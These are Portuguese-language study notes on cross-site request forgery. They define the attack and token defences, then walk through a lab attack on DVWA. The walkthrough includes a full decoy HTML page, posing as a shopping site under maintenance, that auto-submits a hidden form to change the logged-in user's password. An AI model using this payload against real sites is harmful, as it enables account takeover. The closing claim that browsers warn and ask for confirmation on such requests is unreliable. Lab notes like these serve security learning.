## O que é?

   - É uma requisição forjada entre sites.


## Funcionalidade

   - Exemplo: um site qualquer com essa vulnerabilidade pode enviar uma requisição pro facebook mudando a senha do usuário, caso ele esteja logado, pois o cookie é necessário para fazer o POST. 


## Proteção contra CSRF

   - token: número aleatório, enviado junto da requisição. Número válido por sessão ou requisição, impedindo que o atacante use o token no formulário que ele está montando. 

## Ataque na prática

   - O ataque consiste em criar uma página web que fará uma requisição em outra trocando os dados do usuário logado.

   - Para isso, devemos subir um servidor apache na máquina e hospedar uma página web na pasta "/var/www/html". Feito isso, podemos criar um arquivo .html com o conteúdo abaixo. 
   ```
   <HTML>
   <head>
         <title> Shopping </title>
         <meta charset="UTF-8">
   </head>
   <body>
         <h1> Acessar página de compras </h1>
         <p> Site em manutenção </p>
         <form action="http://192.168.200.5/dvwa/vulnerabilities/csrf/">
                  <input type="hidden" name="password_new" value="novasenha">
                  <input type="hidden" name="password_conf" value="novasenha">
                  <input type="hidden" name="Change" value="Change">
         </form>
         <script> document.forms[0].submit(); </script>
   </body>
   </HTML>
   ```

   - Essa página html é extremamente simples e a parte mais importante é a tag form e script. 

   - A tag form define um método get, por padrão, na url especificada. Os inputs informam a nova senha, a confirmação dela e o 'click' no botão na página que apresenta o CSRF. 

   - A tag script faz o submit desse form, executa a ação dita na tag form.

   - É imprescindível o estudo da página que apresenta a falha CSRF, para o atacante saber como fará a página bait com o ataque CSRF.

   - Assim como XSS reflected, o CSRF deve passar a url da página que fará a requisição forçada para o cliente (client side).

   - NOTA IMPORTANTE: navegadores por padrão avisam ao cliente que aquela página está fazendo uma requisição a outra, pedindo confirmação e avisando a conexão não é segura. 